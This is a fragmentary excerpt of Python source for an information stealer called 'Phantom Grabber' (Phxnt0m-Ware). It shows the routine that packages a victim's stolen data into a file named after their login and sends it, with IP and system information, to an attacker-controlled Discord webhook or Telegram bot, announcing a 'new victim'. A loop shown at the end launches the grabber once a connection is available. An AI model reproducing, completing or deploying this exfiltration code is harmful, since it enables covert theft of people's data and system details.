...
class PhantomGrabber:
    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        filename = "Phantom-%s.%s" % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://cdn.discordapp.com/attachments/1134990607538987009/1139331726028574750/oni.png"
                image_url1 = "https://cdn.discordapp.com/attachments/1134990607538987009/1139333691043229786/112121.jpg"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://github.com/Phxnt0m1/Phxnt0mWare-Grabber",
                            "color": 16777215,
                            "footer": {
                                "text": "Grabbed by Phxnt0m-Ware | https://github.com/Phxnt0m1/Phxnt0mWare-Grabber"
                            },
                            "thumbnail": {
                                "url": image_url1
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Phantom Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
        ...
        while True:
            try:
                ...
                if Utility.IsConnectedToInternet(): # Check if internet connection is available
                    ...
                    PhantomGrabber() # Start the grabber
